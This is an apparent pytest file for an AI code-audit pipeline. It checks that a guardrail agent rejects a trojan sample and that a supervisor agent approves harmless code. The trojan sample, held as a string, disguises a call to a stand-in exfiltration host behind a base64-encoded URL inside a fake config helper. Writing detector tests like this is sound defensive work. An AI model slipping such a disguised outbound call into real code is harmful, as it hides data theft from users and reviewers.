"""
System 2 & 2c Rigor Test.
Verifies the separation of Executive Audit (S2) and Continuous Guardrails (S2c).
"""
import sys
import os
from pathlib import Path
# Standard absolute imports

from tools.audit.guardrail_agent import run_guardrail_audit
from tools.audit.supervisor_agent import run_supervisor_audit

import pytest

@pytest.mark.asyncio
async def test_rigor():
    print("🛡️ SYSTEM 2/2c: SUPERVISOR & GUARDRAIL RIGOR TEST")
    print("-" * 50)

    # Payload 1: Hidden Network Trojan (Should be caught by S2c Heuristics)
    payload_1 = """
import requests
import base64

def get_config():
    # Helper to decode local config
    c = "aHR0cDovL2V4ZmlsdHJhdGUuY29tL3N0ZWFs"
    url = base64.b64decode(c).decode()
    requests.get(url) # Trojan
    return {"status": "ok"}
"""

    print("[CASE 1] Testing System 2c (Guardrail) Heuristic Rejection...")
    res_2c = run_guardrail_audit(payload_1, "Test hidden network")
    assert res_2c.get("status") == "rejected" and res_2c.get("risk_level") == "critical", f"❌ Failure: System 2c missed the Trojan. Status: {res_2c.get('status')}"
    print("✅ Success: System 2c (Guardrail) auto-blocked the Trojan.")
    print(f"   Critique: {res_2c.get('critique')}")

    print("\n[CASE 2] Testing System 2 (Executive) High-Fidelity Audit...")
    # System 2 Executive Audit Approved or custom string result
    import tools.audit.supervisor_agent as supervisor
    original_court = supervisor.adversarial_court
    supervisor.adversarial_court = None
    try:
        res_2 = await run_supervisor_audit("Review this standard code", "def hello(): print('world')")
        if isinstance(res_2, dict):
            status = res_2.get("status", "")
            assert isinstance(status, str) and status.lower() == "approved", f"❌ Failure: System 2 rejected safe code. Status: {status}"
            print("✅ Success: System 2 (Executive) approved safe code.")
        else:
            print(f"ℹ️ System 2 Note: {res_2}")
    finally:
        supervisor.adversarial_court = original_court

    print("-" * 50)
    print("🏆 RIGOR VERDICT: System 2 and 2c separation is operational.")

if __name__ == "__main__":
    import asyncio
    asyncio.run(test_rigor())
